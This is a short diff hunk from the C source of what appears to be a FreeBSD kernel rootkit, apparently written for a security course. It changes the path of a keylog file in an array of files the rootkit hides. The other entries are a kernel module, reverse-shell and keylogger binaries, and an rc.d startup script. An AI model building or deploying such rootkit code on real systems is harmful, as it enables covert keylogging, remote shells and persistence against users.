@@ -38,7 +38,7 @@
 static const char *hidden_files[NUM_HIDDEN_FILES] = {
 	"/boot/modules/rootkit.ko",
 	"/boot/loader.conf.transparent",
-	"/usr/home/comp6447/keylog_file",
+	"/tmp/keylog_file",
 	"/usr/sbin/rshell_target",
 	"/usr/sbin/keylog_target",
 	"/etc/rc.d/rshell",
